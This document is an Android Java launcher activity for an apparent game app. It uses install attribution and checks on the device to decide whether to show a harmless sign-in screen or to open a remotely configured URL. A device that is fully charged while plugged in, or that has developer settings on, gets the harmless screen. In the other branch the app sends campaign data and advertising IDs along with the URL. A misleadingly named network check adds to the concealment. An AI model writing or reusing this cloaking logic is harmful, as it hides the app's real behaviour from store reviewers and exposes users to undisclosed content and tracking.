package sil.sil.lis;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Bundle;
import android.util.Log;
import android.view.animation.AccelerateDecelerateInterpolator;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.bumptech.glide.Glide;
import com.facebook.FacebookSdk;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;

import butterknife.BindView;
import butterknife.ButterKnife;

import static android.os.AsyncTask.*;

public class StarterActivity extends AppCompatActivity implements LoggerInterface{

    private final String APPS_FLYER_ID = "jgAsuFYhJbYyt9z8zGaCGa";
    GamePrefsSaver gprefs;
    AdId adid;

    @BindView(R.id.gif)
    ImageView gif;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_starter);
        ButterKnife.bind(this);
        gprefs = new GamePrefsSaver(this);

        Glide.with(this).load(R.drawable.gif).into(gif);

        OneSignal.initWithContext(this);
        OneSignal.setAppId("2f9cd6a2-1928-4922-a322-59cad2d23157");
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.fullyInitialize();

        adid = new AdId(this);
        adid.start();

        if (!gprefs.getFirstSt()) {
            if (!gprefs.getGamePoint().isEmpty()) {
                playGame();
            } else {
                play();
            }
        } else {
            if (internetConnection()) {
                play();
            } else {
                AppsFlyerLib.getInstance().init(APPS_FLYER_ID, new AppsFlyerConversionListener() {
                    @Override
                    public void onConversionDataSuccess(Map<String, Object> conversionData) {
                        if (gprefs.getfFlyer()) {
                            FirebaseRemoteConfig firebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                                    .setMinimumFetchIntervalInSeconds(3600)
                                    .build();
                            firebaseRemoteConfig.setConfigSettingsAsync(configSettings);
                            firebaseRemoteConfig.fetchAndActivate()
                                    .addOnCompleteListener(StarterActivity.this, task -> {
                                        try {
                                            String silverString = firebaseRemoteConfig.getValue("Silver").asString();
                                            JSONObject silverGame = new JSONObject(silverString);
                                            JSONObject jsonObject = new JSONObject(conversionData);

                                            if (jsonObject.optString("af_status").equals("Non-organic")) {
                                                String campaign = jsonObject.optString("campaign");
                                                if (campaign.isEmpty() || campaign.equals("null")) campaign = jsonObject.optString("c");
                                                String[] splitsCampaign = campaign.split("_");
                                                try{
                                                    OneSignal.sendTag("g_id", gprefs.getAdId());
                                                    OneSignal.sendTag("user_id", splitsCampaign[2]);
                                                }catch(Exception e){
                                                }
                                                gprefs.setGamePoint(gamePlayString(silverGame.optString("silwer3"),
                                                        campaign,
                                                        AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()),
                                                        gprefs.getAdId()));
                                                playGame();
                                                apps();

                                            } else if (jsonObject.optString("af_status").equals("Organic")) {
                                                if (((battaryLevel() == 100 || battaryLevel() == 90) && isCharging()) || isDeveloper()) {
                                                    gprefs.setGamePoint("");
                                                    play();
                                                } else {
                                                    try{
                                                        OneSignal.sendTag("g_id", gprefs.getAdId());
                                                        OneSignal.sendTag("user_id", null);
                                                    }catch(Exception e){
                                                    }
                                                    gprefs.setGamePoint(gamePlayString(silverGame.optString("silwer3"),
                                                            "null",
                                                            AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext()),
                                                            gprefs.getAdId()));
                                                    playGame();
                                                    apps();
                                                }
                                            } else {
                                                gprefs.setGamePoint("");
                                                play();
                                                apps();
                                            }
                                            gprefs.setFirstSt(false);
                                            gprefs.setfFlyer(false);
                                            apps();
                                        } catch (Exception ex) {
                                        }
                                    });
                        }
                    }

                    @Override
                    public void onConversionDataFail(String errorMessage) {
                    }

                    @Override
                    public void onAppOpenAttribution(Map<String, String> attributionData) {
                    }

                    @Override
                    public void onAttributionFailure(String errorMessage) {
                    }
                }, this);
                AppsFlyerLib.getInstance().start(this);
                AppsFlyerLib.getInstance().enableFacebookDeferredApplinks(true);
            }
        }
    }

    @Override
    public void playGame() {
        startActivity(new Intent(StarterActivity.this, GameActivity.class));
        finish();
    }

    @Override
    public void play() {
        startActivity(new Intent(StarterActivity.this, SignInActivity.class));
        finish();
    }

    public boolean isDeveloper(){
        return android.provider.Settings.Secure.getInt(getApplicationContext().getContentResolver(),
                android.provider.Settings.Global.DEVELOPMENT_SETTINGS_ENABLED , 0) != 0;
    }

    @Override
    public boolean isCharging() {
        final Intent batteryIntent = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        int status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
        boolean batteryCharge = status==BatteryManager.BATTERY_STATUS_CHARGING;
        int chargePlug = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
        boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
        boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
        return batteryCharge || usbCharge || acCharge;
    }

    @Override
    public int battaryLevel() {
        BatteryManager bm = (BatteryManager)getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    @Override
    public String gamePlayString(String dest, String camp, String uId, String g_ad_id) {
        return dest + "?nmg=" + camp + "&dv_id=" + uId + "&avr=" + g_ad_id;
    }

    @Override
    public boolean internetConnection() {
        return ((ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo() == null;
    }

    @Override
    public void apps() {
        AppsFlyerLib.getInstance().unregisterConversionListener();
    }

}